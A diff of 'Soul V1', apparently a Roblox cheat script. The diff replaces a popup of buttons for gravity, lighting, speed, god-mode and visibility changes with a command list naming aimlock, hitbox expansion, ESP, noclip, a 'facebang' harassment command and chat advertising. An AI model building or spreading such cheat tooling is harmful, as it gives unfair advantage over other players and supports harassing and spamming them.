@@ -1,3 +1,4 @@
+
 -- Soul V1 | Bloodshot Red | Onyx-style Layout
 -- Mutual tag detection via BillboardGui marker (replicates natively to all clients)
 
@@ -2426,529 +2427,191 @@ local extraTabBtn = createTabButton("Extra", 9)
 local extraPage = createPage()
 tabs["Extra"].page = extraPage
 
--- When Extra tab is clicked, open a floating Extra Commands GUI
-local extraGuiOpen = false
-local extraGui = nil
+-- Small label inside the tab page
+local extraInfoLbl = Instance.new("TextLabel")
+extraInfoLbl.Size = UDim2.new(1, -24, 0, 40); extraInfoLbl.Position = UDim2.new(0, 12, 0, 16)
+extraInfoLbl.BackgroundTransparency = 1
+extraInfoLbl.Text = "Click the Extra tab again to open Command List"
+extraInfoLbl.TextColor3 = TXT_DIM; extraInfoLbl.TextSize = 12; extraInfoLbl.Font = Enum.Font.Gotham
+extraInfoLbl.TextXAlignment = Enum.TextXAlignment.Center; extraInfoLbl.TextWrapped = true
+extraInfoLbl.Parent = extraPage
 
-local function openExtraGui()
-    if extraGui and extraGui.Parent then extraGui:Destroy(); extraGuiOpen = false; return end
-    extraGuiOpen = true
+-- Command list popup
+local cmdListGui = nil
 
-    extraGui = Instance.new("ScreenGui")
-    extraGui.Name = "SoulExtraGui"; extraGui.ResetOnSpawn = false
-    extraGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    extraGui.DisplayOrder = 45; extraGui.Parent = player.PlayerGui
+local CMDS = {
+    { name = ";sfly",         desc = "Toggle Superman Fly"           },
+    { name = ";baseplate",    desc = "Toggle Infinite Baseplate"     },
+    { name = ";speed",        desc = "Toggle Speed Boost"            },
+    { name = ";noclip",       desc = "Toggle No Clip"                },
+    { name = ";zoom",         desc = "Toggle Infinite Zoom"          },
+    { name = ";teleport",     desc = "Click Teleport [F]"            },
+    { name = ";afk",          desc = "Toggle Anti-AFK"               },
+    { name = ";aimlock",      desc = "Toggle Aimlock"                },
+    { name = ";hitbox",       desc = "Toggle Hitbox Expander"        },
+    { name = ";autoclicker",  desc = "Toggle Auto Clicker"           },
+    { name = ";infijump",     desc = "Toggle Infinite Jump"          },
+    { name = ";esp",          desc = "Toggle Player ESP"             },
+    { name = ";fullbright",   desc = "Toggle Full Bright"            },
+    { name = ";hidegui",      desc = "Toggle Hide GUI"               },
+    { name = ";sad",          desc = "Send Soul V1 chat ad"          },
+    { name = ";facebang",     desc = "Toggle Face Bang"              },
+    { name = ";fpson",        desc = "FPS Boost ON"                  },
+    { name = ";fpsoff",       desc = "FPS Boost OFF"                 },
+    { name = ";mute",         desc = "Mute all sounds"               },
+    { name = ";unmute",       desc = "Unmute all sounds"             },
+    { name = ";day",          desc = "Set time to daytime"           },
+    { name = ";night",        desc = "Set time to night"             },
+    { name = ";sunrise",      desc = "Set time to sunrise"           },
+    { name = ";sunset",       desc = "Set time to sunset"            },
+    { name = ";fog",          desc = "Add thick fog"                 },
+    { name = ";clearfog",     desc = "Remove all fog"                },
+    { name = ";lowgrav",      desc = "Low gravity (5)"               },
+    { name = ";nograv",       desc = "Zero gravity (space)"          },
+    { name = ";highgrav",     desc = "High gravity (400)"            },
+    { name = ";normgrav",     desc = "Normal gravity (196.2)"        },
+    { name = ";invis",        desc = "Make yourself invisible"       },
+    { name = ";vis",          desc = "Make yourself visible"         },
+    { name = ";freeze",       desc = "Freeze character in place"     },
+    { name = ";unfreeze",     desc = "Unfreeze character"            },
+    { name = ";god",          desc = "God mode - lock health at max" },
+    { name = ";fling",        desc = "Fling yourself into the air"   },
+    { name = ";explode",      desc = "Explosion at your position"    },
+    { name = ";spin",         desc = "Spin your character 360°"      },
+    { name = ";reset",        desc = "Reset your character"          },
+    { name = ";rejoin",       desc = "Rejoin current server"         },
+    { name = ";fp",           desc = "Lock to first person"          },
+    { name = ";fc",           desc = "Free camera zoom"              },
+    { name = ";maxjump",      desc = "Max jump power (500)"          },
+    { name = ";resetjump",    desc = "Reset jump power (50)"         },
+    { name = ";spawn",        desc = "Teleport to map spawn"         },
+    { name = ";disco",        desc = "Disco lighting flash"          },
+    { name = ";sky pink",     desc = "Set sky to pink"               },
+    { name = ";sky red",      desc = "Set sky to red"                },
+    { name = ";sky blue",     desc = "Set sky to blue"               },
+    { name = ";sky purple",   desc = "Set sky to purple"             },
+    { name = ";sky green",    desc = "Set sky to green"              },
+    { name = ";sky orange",   desc = "Set sky to orange"             },
+    { name = ";sky yellow",   desc = "Set sky to yellow"             },
+    { name = ";sky cyan",     desc = "Set sky to cyan"               },
+    { name = ";sky black",    desc = "Set sky to black"              },
+    { name = ";sky white",    desc = "Set sky to white"              },
+    { name = ";sky galaxy",   desc = "Set sky to galaxy purple"      },
+    { name = ";sky reset",    desc = "Reset sky to default"          },
+    { name = ";help",         desc = "Show this command list"        },
+}
 
-    local eg = Instance.new("Frame")
-    eg.Size = UDim2.new(0, 320, 0, 0)
-    eg.Position = UDim2.new(0.5, -160, 0.5, -160)
-    eg.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
-    eg.BorderSizePixel = 0; eg.ClipsDescendants = true
-    eg.ZIndex = 10; eg.Parent = extraGui
-    Instance.new("UICorner", eg).CornerRadius = UDim.new(0, 12)
-    local egs = Instance.new("UIStroke", eg)
-    egs.Color = Color3.fromRGB(139, 0, 0); egs.Thickness = 1.5
+local function openCmdList()
+    -- Toggle off if already open
+    if cmdListGui and cmdListGui.Parent then
+        cmdListGui:Destroy(); cmdListGui = nil; return
+    end
+
+    cmdListGui = Instance.new("ScreenGui")
+    cmdListGui.Name = "SoulCmdList"; cmdListGui.ResetOnSpawn = false
+    cmdListGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    cmdListGui.DisplayOrder = 45; cmdListGui.Parent = player.PlayerGui
+
+    -- Card
+    local card = Instance.new("Frame")
+    card.Size = UDim2.new(0, 300, 0, 0)  -- animates to full height
+    card.Position = UDim2.new(0, 20, 0.5, -260)
+    card.BackgroundColor3 = Color3.fromRGB(16, 3, 3)
+    card.BorderSizePixel = 0; card.ClipsDescendants = true
+    card.ZIndex = 10; card.Parent = cmdListGui
+    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
+    local cStroke = Instance.new("UIStroke", card)
+    cStroke.Color = Color3.fromRGB(139, 0, 0); cStroke.Thickness = 1.5
 
     -- Header
-    local eHdr = Instance.new("Frame")
-    eHdr.Size = UDim2.new(1, 0, 0, 42)
-    eHdr.BackgroundColor3 = Color3.fromRGB(25, 4, 4)
-    eHdr.BorderSizePixel = 0; eHdr.ZIndex = 11; eHdr.Parent = eg
-    Instance.new("UICorner", eHdr).CornerRadius = UDim.new(0, 12)
+    local hdr = Instance.new("Frame")
+    hdr.Size = UDim2.new(1, 0, 0, 44)
+    hdr.BackgroundColor3 = Color3.fromRGB(25, 4, 4)
+    hdr.BorderSizePixel = 0; hdr.ZIndex = 11; hdr.Parent = card
+    Instance.new("UICorner", hdr).CornerRadius = UDim.new(0, 12)
 
-    local eTitle = Instance.new("TextLabel")
-    eTitle.Size = UDim2.new(1, -50, 1, 0); eTitle.Position = UDim2.new(0, 14, 0, 0)
-    eTitle.BackgroundTransparency = 1; eTitle.Text = "⚡  Extra Commands"
-    eTitle.TextColor3 = Color3.new(1, 1, 1); eTitle.TextSize = 15
-    eTitle.Font = Enum.Font.GothamBold; eTitle.TextXAlignment = Enum.TextXAlignment.Left
-    eTitle.ZIndex = 12; eTitle.Parent = eHdr
+    -- Header icon + title
+    local hIcon = Instance.new("TextLabel")
+    hIcon.Size = UDim2.new(0, 30, 1, 0); hIcon.Position = UDim2.new(0, 10, 0, 0)
+    hIcon.BackgroundTransparency = 1; hIcon.Text = "≡"
+    hIcon.TextColor3 = RED_GLOW; hIcon.TextSize = 22; hIcon.Font = Enum.Font.GothamBold
+    hIcon.ZIndex = 12; hIcon.Parent = hdr
 
-    local eClose = Instance.new("TextButton")
-    eClose.Size = UDim2.new(0, 28, 0, 28); eClose.Position = UDim2.new(1, -34, 0.5, -14)
-    eClose.BackgroundColor3 = Color3.fromRGB(100, 0, 0); eClose.Text = "✕"
-    eClose.TextColor3 = Color3.new(1,1,1); eClose.TextSize = 13; eClose.Font = Enum.Font.GothamBold
-    eClose.ZIndex = 12; eClose.Parent = eHdr
-    Instance.new("UICorner", eClose).CornerRadius = UDim.new(0, 6)
-    eClose.MouseButton1Click:Connect(function() extraGui:Destroy(); extraGuiOpen = false end)
+    local hTitle = Instance.new("TextLabel")
+    hTitle.Size = UDim2.new(1, -80, 1, 0); hTitle.Position = UDim2.new(0, 42, 0, 0)
+    hTitle.BackgroundTransparency = 1; hTitle.Text = "Command List"
+    hTitle.TextColor3 = Color3.new(1, 1, 1); hTitle.TextSize = 16; hTitle.Font = Enum.Font.GothamBold
+    hTitle.TextXAlignment = Enum.TextXAlignment.Left; hTitle.ZIndex = 12; hTitle.Parent = hdr
 
-    -- Scrollable content
-    local eScroll = Instance.new("ScrollingFrame")
-    eScroll.Size = UDim2.new(1, -16, 1, -52); eScroll.Position = UDim2.new(0, 8, 0, 50)
-    eScroll.BackgroundTransparency = 1; eScroll.BorderSizePixel = 0
-    eScroll.ScrollBarThickness = 4; eScroll.ScrollBarImageColor3 = Color3.fromRGB(139, 0, 0)
-    eScroll.CanvasSize = UDim2.new(0, 0, 0, 0); eScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
-    eScroll.ZIndex = 11; eScroll.Parent = eg
+    local hClose = Instance.new("TextButton")
+    hClose.Size = UDim2.new(0, 26, 0, 26); hClose.Position = UDim2.new(1, -32, 0.5, -13)
+    hClose.BackgroundColor3 = Color3.fromRGB(100, 0, 0); hClose.Text = "×"
+    hClose.TextColor3 = Color3.new(1,1,1); hClose.TextSize = 18; hClose.Font = Enum.Font.GothamBold
+    hClose.ZIndex = 12; hClose.Parent = hdr
+    Instance.new("UICorner", hClose).CornerRadius = UDim.new(0, 6)
+    hClose.MouseButton1Click:Connect(function() cmdListGui:Destroy(); cmdListGui = nil end)
 
-    local eLayout = Instance.new("UIListLayout")
-    eLayout.SortOrder = Enum.SortOrder.LayoutOrder; eLayout.Padding = UDim.new(0, 6)
-    eLayout.Parent = eScroll
-    local ePad = Instance.new("UIPadding")
-    ePad.PaddingTop = UDim.new(0, 4); ePad.PaddingBottom = UDim.new(0, 4)
-    ePad.Parent = eScroll
+    -- Scrollable list
+    local scroll = Instance.new("ScrollingFrame")
+    scroll.Size = UDim2.new(1, -12, 1, -52); scroll.Position = UDim2.new(0, 6, 0, 50)
+    scroll.BackgroundTransparency = 1; scroll.BorderSizePixel = 0
+    scroll.ScrollBarThickness = 3; scroll.ScrollBarImageColor3 = Color3.fromRGB(139, 0, 0)
+    scroll.CanvasSize = UDim2.new(0, 0, 0, 0); scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    scroll.ZIndex = 11; scroll.Parent = card
 
-    -- Helper to add an extra button
-    local function addExtraBtn(label, subtext, fn)
-        local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(1, 0, 0, 52)
-        btn.BackgroundColor3 = BG_CARD; btn.Text = ""
-        btn.LayoutOrder = 1; btn.ZIndex = 12; btn.Parent = eScroll
-        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
-        local bs = Instance.new("UIStroke", btn)
-        bs.Color = RED_STROKE; bs.Thickness = 1; bs.Transparency = 0.5
+    local layout = Instance.new("UIListLayout")
+    layout.SortOrder = Enum.SortOrder.LayoutOrder; layout.Padding = UDim.new(0, 2)
+    layout.Parent = scroll
+    local pad = Instance.new("UIPadding")
+    pad.PaddingTop = UDim.new(0, 4); pad.PaddingBottom = UDim.new(0, 6)
+    pad.PaddingLeft = UDim.new(0, 2); pad.PaddingRight = UDim.new(0, 2)
+    pad.Parent = scroll
 
-        local dot = Instance.new("Frame")
-        dot.Size = UDim2.new(0, 9, 0, 9); dot.Position = UDim2.new(0, 12, 0.5, -4)
-        dot.BackgroundColor3 = RED_GLOW; dot.ZIndex = 13; dot.Parent = btn
-        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
+    for i, cmd in ipairs(CMDS) do
+        local row = Instance.new("Frame")
+        row.Size = UDim2.new(1, 0, 0, 52); row.LayoutOrder = i
+        row.BackgroundColor3 = Color3.fromRGB(28, 5, 5)
+        row.BackgroundTransparency = 0; row.BorderSizePixel = 0
+        row.ZIndex = 12; row.Parent = scroll
+        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)
 
-        local lbl = Instance.new("TextLabel")
-        lbl.Size = UDim2.new(1, -30, 0, 26); lbl.Position = UDim2.new(0, 28, 0, 6)
-        lbl.BackgroundTransparency = 1; lbl.Text = label
-        lbl.TextColor3 = TXT_WHITE; lbl.TextSize = 13; lbl.Font = Enum.Font.GothamBold
-        lbl.TextXAlignment = Enum.TextXAlignment.Left; lbl.ZIndex = 13; lbl.Parent = btn
+        local cmdLbl = Instance.new("TextLabel")
+        cmdLbl.Size = UDim2.new(1, -14, 0, 26); cmdLbl.Position = UDim2.new(0, 12, 0, 5)
+        cmdLbl.BackgroundTransparency = 1; cmdLbl.Text = cmd.name
+        cmdLbl.TextColor3 = Color3.new(1,1,1); cmdLbl.TextSize = 14; cmdLbl.Font = Enum.Font.GothamBold
+        cmdLbl.TextXAlignment = Enum.TextXAlignment.Left; cmdLbl.ZIndex = 13; cmdLbl.Parent = row
 
-        local sub = Instance.new("TextLabel")
-        sub.Size = UDim2.new(1, -30, 0, 18); sub.Position = UDim2.new(0, 28, 0, 28)
-        sub.BackgroundTransparency = 1; sub.Text = subtext
-        sub.TextColor3 = TXT_DIM; sub.TextSize = 11; sub.Font = Enum.Font.Gotham
-        sub.TextXAlignment = Enum.TextXAlignment.Left; sub.ZIndex = 13; sub.Parent = btn
-
-        btn.MouseEnter:Connect(function()
-            TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = RED_BRIGHT }):Play()
-            TweenService:Create(dot, TweenInfo.new(0.12), { BackgroundColor3 = GREEN_LOADED }):Play()
-        end)
-        btn.MouseLeave:Connect(function()
-            TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = BG_CARD }):Play()
-            TweenService:Create(dot, TweenInfo.new(0.12), { BackgroundColor3 = RED_GLOW }):Play()
-        end)
-        btn.MouseButton1Click:Connect(function()
-            showNotif(label, true)
-            pcall(fn)
-        end)
-        return btn
+        local descLbl = Instance.new("TextLabel")
+        descLbl.Size = UDim2.new(1, -14, 0, 18); descLbl.Position = UDim2.new(0, 12, 0, 28)
+        descLbl.BackgroundTransparency = 1; descLbl.Text = cmd.desc
+        descLbl.TextColor3 = TXT_DIM; descLbl.TextSize = 11; descLbl.Font = Enum.Font.Gotham
+        descLbl.TextXAlignment = Enum.TextXAlignment.Left; descLbl.ZIndex = 13; descLbl.Parent = row
     end
 
-    -- ── EXTRA COMMANDS ──────────────────────────────────────────
-    addExtraBtn("Rejoin Server", "Teleport back into the same game", function()
-        game:GetService("TeleportService"):Teleport(game.PlaceId, player)
-    end)
+    -- Animate open
+    local targetH = math.min(#CMDS * 54 + 60, 520)
+    TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        { Size = UDim2.new(0, 300, 0, targetH) }):Play()
 
-    addExtraBtn("Reset Character", "Kill and respawn your character", function()
-        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.Health = 0 end
-    end)
-
-    addExtraBtn("Copy UserId", "Print your Roblox UserId to output", function()
-        print("Your UserId: " .. tostring(player.UserId))
-        showNotif("UserId: " .. tostring(player.UserId), true)
-    end)
-
-    addExtraBtn("Fullscreen Chat", "Open Roblox chat window", function()
-        game:GetService("GuiService"):SetMenuIsOpen(true, Enum.KeyCode.Slash)
-    end)
-
-    addExtraBtn("Spin Character", "Spin your character 360 continuously", function()
-        local char = player.Character
-        local root = char and char:FindFirstChild("HumanoidRootPart")
-        if not root then return end
-        task.spawn(function()
-            for _ = 1, 60 do
-                root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(6), 0)
-                task.wait(0.01)
-            end
-        end)
-    end)
-
-    addExtraBtn("Invisible (Local)", "Make yourself transparent locally", function()
-        local char = player.Character
-        if not char then return end
-        for _, p in ipairs(char:GetDescendants()) do
-            if p:IsA("BasePart") or p:IsA("Decal") then
-                p.Transparency = 1
-            end
-        end
-    end)
-
-    addExtraBtn("Visible Again", "Restore your character visibility", function()
-        local char = player.Character
-        if not char then return end
-        for _, p in ipairs(char:GetDescendants()) do
-            if p:IsA("BasePart") then p.Transparency = 0 end
-            if p:IsA("Decal") then p.Transparency = 0 end
-        end
-    end)
-
-    addExtraBtn("Freeze Character", "Stop your character from moving", function()
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        if root then root.Anchored = true end
-    end)
-
-    addExtraBtn("Unfreeze Character", "Allow your character to move again", function()
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        if root then root.Anchored = false end
-    end)
-
-    addExtraBtn("Goto Spawn", "Teleport to map spawn point", function()
-        local spawns = workspace:FindFirstChildOfClass("SpawnLocation")
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        if spawns and root then
-            root.CFrame = spawns.CFrame + Vector3.new(0, 5, 0)
-        end
-    end)
-
-    addExtraBtn("Print Players", "List all players in output", function()
-        print("=== Players in Server ===")
-        for _, p in ipairs(Players:GetPlayers()) do
-            print(p.Name .. " (ID: " .. p.UserId .. ")")
-        end
-    end)
-
-    addExtraBtn("Workspace Fog", "Add thick fog to the workspace", function()
-        local l = game:GetService("Lighting")
-        l.FogEnd = 60; l.FogStart = 0
-        l.FogColor = Color3.fromRGB(120,120,120)
-    end)
-
-    addExtraBtn("Clear Fog", "Remove all fog from workspace", function()
-        local l = game:GetService("Lighting")
-        l.FogEnd = 100000; l.FogStart = 0
-    end)
-
-    addExtraBtn("Teleport to 0,0,0", "Teleport to world origin", function()
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        if root then root.CFrame = CFrame.new(0, 10, 0) end
-    end)
-
-    addExtraBtn("Max Brightness", "Set lighting to maximum brightness", function()
-        local l = game:GetService("Lighting")
-        l.Brightness = 10; l.ClockTime = 14; l.GlobalShadows = false
-    end)
-
-    addExtraBtn("Night Mode", "Set time to midnight", function()
-        local l = game:GetService("Lighting")
-        l.ClockTime = 0; l.Brightness = 0.2; l.GlobalShadows = true
-    end)
-
-    addExtraBtn("Sunrise", "Set time to sunrise", function()
-        game:GetService("Lighting").ClockTime = 6
-    end)
-
-    addExtraBtn("Sunset", "Set time to sunset", function()
-        game:GetService("Lighting").ClockTime = 18
-    end)
-
-    addExtraBtn("Low Gravity", "Set gravity to 5 (floaty)", function()
-        workspace.Gravity = 5
-    end)
-
-    addExtraBtn("Normal Gravity", "Reset gravity to default (196.2)", function()
-        workspace.Gravity = 196.2
-    end)
-
-    addExtraBtn("High Gravity", "Set gravity to 400 (heavy)", function()
-        workspace.Gravity = 400
-    end)
-
-    addExtraBtn("Zero Gravity", "Set gravity to 0 (space)", function()
-        workspace.Gravity = 0
-    end)
-
-    addExtraBtn("Walk Speed x2", "Double your walk speed", function()
-        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.WalkSpeed = hum.WalkSpeed * 2 end
-    end)
-
-    addExtraBtn("Walk Speed Reset", "Reset walk speed to 16", function()
-        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.WalkSpeed = 16 end
-    end)
-
-    addExtraBtn("Max Jump Power", "Set jump to maximum (500)", function()
-        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-        if hum then
-            pcall(function() hum.UseJumpPower = true end)
-            hum.JumpPower = 500
-        end
-    end)
-
-    addExtraBtn("Reset Jump Power", "Reset jump power to default (50)", function()
-        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-        if hum then
-            pcall(function() hum.UseJumpPower = true end)
-            hum.JumpPower = 50
-        end
-    end)
-
-    addExtraBtn("God Mode (HP Lock)", "Lock health at max every heartbeat", function()
-        RunService.Heartbeat:Connect(function()
-            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-            if hum then hum.Health = hum.MaxHealth end
-        end)
-    end)
-
-    addExtraBtn("Print Server Info", "Show PlaceId and JobId in output", function()
-        print("PlaceId: " .. game.PlaceId)
-        print("JobId: " .. game.JobId)
-        print("Players: " .. #Players:GetPlayers())
-    end)
-
-    addExtraBtn("Sit Down", "Force your character to sit", function()
-        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.Sit = true end
-    end)
-
-    addExtraBtn("Stand Up", "Make your character stand up", function()
-        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.Sit = false end
-    end)
-
-    addExtraBtn("Delete All Tools", "Remove all tools from backpack", function()
-        for _, t in ipairs(player.Backpack:GetChildren()) do
-            if t:IsA("Tool") then t:Destroy() end
-        end
-    end)
-
-    addExtraBtn("Unanchor All Parts", "Unanchor everything in workspace", function()
-        for _, v in ipairs(workspace:GetDescendants()) do
-            if v:IsA("BasePart") and not v:IsDescendantOf(player.Character or Instance.new("Folder")) then
-                pcall(function() v.Anchored = false end)
-            end
-        end
-    end)
-
-    addExtraBtn("Big Head", "Scale your head to 3x size", function()
-        local head = player.Character and player.Character:FindFirstChild("Head")
-        if head then head.Size = Vector3.new(3, 3, 3) end
-    end)
-
-    addExtraBtn("Normal Head", "Reset head size", function()
-        local head = player.Character and player.Character:FindFirstChild("Head")
-        if head then head.Size = Vector3.new(2, 1, 1) end
-    end)
-
-    addExtraBtn("First Person Lock", "Force first person camera", function()
-        player.CameraMaxZoomDistance = 0.5
-    end)
-
-    addExtraBtn("Unlock Camera Zoom", "Reset camera zoom limits", function()
-        player.CameraMaxZoomDistance = 400
-        player.CameraMinZoomDistance = 0.5
-    end)
-
-    addExtraBtn("Disco Lights", "Rapidly cycle lighting colours", function()
-        local colours = {
-            Color3.fromRGB(255,0,0), Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255),
-            Color3.fromRGB(255,255,0), Color3.fromRGB(255,0,255), Color3.fromRGB(0,255,255),
-        }
-        task.spawn(function()
-            local l = game:GetService("Lighting")
-            for _ = 1, 30 do
-                l.Ambient = colours[math.random(#colours)]
-                l.OutdoorAmbient = colours[math.random(#colours)]
-                task.wait(0.15)
-            end
-            l.Ambient = Color3.fromRGB(70,70,70)
-            l.OutdoorAmbient = Color3.fromRGB(70,70,70)
-        end)
-    end)
-
-    addExtraBtn("Rainbow Character", "Cycle your character parts through colours", function()
-        task.spawn(function()
-            local char = player.Character; if not char then return end
-            local rainbow = {
-                Color3.fromRGB(255,0,0), Color3.fromRGB(255,165,0), Color3.fromRGB(255,255,0),
-                Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255), Color3.fromRGB(139,0,255),
-            }
-            for _, c in ipairs(rainbow) do
-                for _, p in ipairs(char:GetDescendants()) do
-                    if p:IsA("BasePart") then
-                        pcall(function() p.Color = c end)
-                    end
-                end
-                task.wait(0.3)
-            end
-        end)
-    end)
-
-    addExtraBtn("Fling Self", "Launch your character into the air", function()
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        if not root then return end
-        local bv = Instance.new("BodyVelocity")
-        bv.MaxForce = Vector3.new(1e5,1e5,1e5)
-        bv.Velocity = Vector3.new(math.random(-80,80), 200, math.random(-80,80))
-        bv.Parent = root
-        game:GetService("Debris"):AddItem(bv, 0.2)
-    end)
-
-    -- ── FPS BOOSTER ──────────────────────────────────────────────
-    addExtraBtn("⚡ FPS Boost (ON)", "Remove particles & effects to boost FPS", function()
-        -- Disable all particle emitters, beams, trails, textures, decals
-        for _, v in ipairs(workspace:GetDescendants()) do
-            pcall(function()
-                if v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
-                    v.Enabled = false
-                elseif v:IsA("Beam") then
-                    v.Enabled = false
-                elseif v:IsA("Trail") then
-                    v.Enabled = false
-                elseif v:IsA("Texture") or v:IsA("Decal") then
-                    v.Transparency = 1
-                end
-            end)
-        end
-        -- Lower lighting effects
-        local l = game:GetService("Lighting")
-        l.GlobalShadows   = false
-        l.FogEnd          = 100000
-        -- Disable post effects
-        for _, e in ipairs(l:GetChildren()) do
-            if e:IsA("PostEffect") then e.Enabled = false end
-        end
-        -- Set low render distance via camera
-        workspace.StreamingEnabled = workspace.StreamingEnabled  -- just read, don't change
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
-    end)
-
-    addExtraBtn("⚡ FPS Boost (OFF)", "Restore visual effects", function()
-        for _, v in ipairs(workspace:GetDescendants()) do
-            pcall(function()
-                if v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
-                    v.Enabled = true
-                elseif v:IsA("Beam") then v.Enabled = true
-                elseif v:IsA("Trail") then v.Enabled = true
-                elseif v:IsA("Texture") or v:IsA("Decal") then v.Transparency = 0
-                end
-            end)
-        end
-        local l = game:GetService("Lighting")
-        l.GlobalShadows = true
-        for _, e in ipairs(l:GetChildren()) do
-            if e:IsA("PostEffect") then e.Enabled = true end
-        end
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
-    end)
-
-    -- ── SKY COLOURS ───────────────────────────────────────────────
-    local skyColors = {
-        { "🩷 Pink Sky",       Color3.fromRGB(255,150,200), Color3.fromRGB(220, 80,160) },
-        { "🔴 Red Sky",        Color3.fromRGB(180,  0,  0), Color3.fromRGB(120,  0,  0) },
-        { "🔵 Blue Sky",       Color3.fromRGB(  0,100,220), Color3.fromRGB(  0, 50,140) },
-        { "🟣 Purple Sky",     Color3.fromRGB(100,  0,200), Color3.fromRGB( 60,  0,130) },
-        { "🟠 Orange Sky",     Color3.fromRGB(255,120, 30), Color3.fromRGB(200, 60,  0) },
-        { "🟡 Yellow Sky",     Color3.fromRGB(255,220, 50), Color3.fromRGB(220,150,  0) },
-        { "🟢 Green Sky",      Color3.fromRGB(  0,180, 80), Color3.fromRGB(  0,100, 40) },
-        { "🩵 Cyan Sky",       Color3.fromRGB(  0,210,230), Color3.fromRGB(  0,130,160) },
-        { "⚪ White Sky",      Color3.fromRGB(230,240,255), Color3.fromRGB(180,200,240) },
-        { "⚫ Black Sky",      Color3.fromRGB(  8,  8, 12), Color3.fromRGB(  4,  4,  8) },
-        { "🌸 Sakura Sky",     Color3.fromRGB(255,190,210), Color3.fromRGB(230,130,170) },
-        { "🌊 Ocean Sky",      Color3.fromRGB(  0, 60,130), Color3.fromRGB(  0, 30, 80) },
-        { "🌌 Galaxy Sky",     Color3.fromRGB( 20,  0, 60), Color3.fromRGB( 10,  0, 40) },
-        { "🍊 Amber Sky",      Color3.fromRGB(255,160,  0), Color3.fromRGB(180, 90,  0) },
-        { "💜 Violet Sky",     Color3.fromRGB( 80,  0,160), Color3.fromRGB( 40,  0,100) },
-        { "❄️ Frost Sky",      Color3.fromRGB(180,220,255), Color3.fromRGB(100,160,220) },
-        { "🌅 Sunset Sky",     Color3.fromRGB(255, 80, 20), Color3.fromRGB(200, 40,  0) },
-        { "🌺 Coral Sky",      Color3.fromRGB(255,100, 80), Color3.fromRGB(200, 50, 30) },
-        { "🤍 Blush Sky",      Color3.fromRGB(255,220,230), Color3.fromRGB(240,180,200) },
-        { "🟤 Sand Sky",       Color3.fromRGB(200,160, 80), Color3.fromRGB(150,100, 40) },
-        { "🔮 Deep Purple Sky",Color3.fromRGB( 60,  0,120), Color3.fromRGB( 30,  0, 80) },
-        { "🌿 Forest Sky",     Color3.fromRGB( 20,100, 40), Color3.fromRGB( 10, 60, 20) },
-        { "🩶 Storm Sky",      Color3.fromRGB( 80, 80,100), Color3.fromRGB( 50, 50, 70) },
-        { "🔴 Crimson Sky",    Color3.fromRGB(160,  0, 30), Color3.fromRGB(100,  0, 20) },
-        { "🌙 Moonlight Sky",  Color3.fromRGB( 60, 60,120), Color3.fromRGB( 30, 30, 80) },
-    }
-
-    for _, sc in ipairs(skyColors) do
-        local name = sc[1]; local fogCol = sc[2]; local ambCol = sc[3]
-        addExtraBtn(name, "Change sky to " .. name:gsub("[^\32-\126]",""):gsub("^ +",""), function()
-            local l = game:GetService("Lighting")
-            l.FogColor       = fogCol
-            l.FogEnd         = 500
-            l.FogStart       = 0
-            l.Ambient        = ambCol
-            l.OutdoorAmbient = ambCol
-        end)
-    end
-
-    addExtraBtn("↺ Reset Sky", "Restore default sky colours", function()
-        local l = game:GetService("Lighting")
-        l.FogColor       = Color3.fromRGB(191,197,200)
-        l.FogEnd         = 100000; l.FogStart = 0
-        l.Ambient        = Color3.fromRGB(70,70,70)
-        l.OutdoorAmbient = Color3.fromRGB(70,70,70)
-        l.GlobalShadows  = true
-        l.Brightness     = 1; l.ClockTime = 14
-    end)
-
-    -- ── MORE USEFUL ───────────────────────────────────────────────
-    addExtraBtn("🔍 Zoom In (FOV 30)", "Set very close camera zoom", function()
-        workspace.CurrentCamera.FieldOfView = 30
-    end)
-
-    addExtraBtn("🔎 Zoom Out (FOV 120)", "Set wide angle camera", function()
-        workspace.CurrentCamera.FieldOfView = 120
-    end)
-
-    addExtraBtn("📷 Default FOV (70)", "Reset camera field of view", function()
-        workspace.CurrentCamera.FieldOfView = 70
-    end)
-
-    addExtraBtn("🎮 Max Render Dist", "Set rendering to maximum quality", function()
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Level21
-    end)
-
-    addExtraBtn("🔇 Mute All Sounds", "Disable all sounds in workspace", function()
-        for _, v in ipairs(workspace:GetDescendants()) do
-            if v:IsA("Sound") then pcall(function() v.Volume = 0 end) end
-        end
-    end)
-
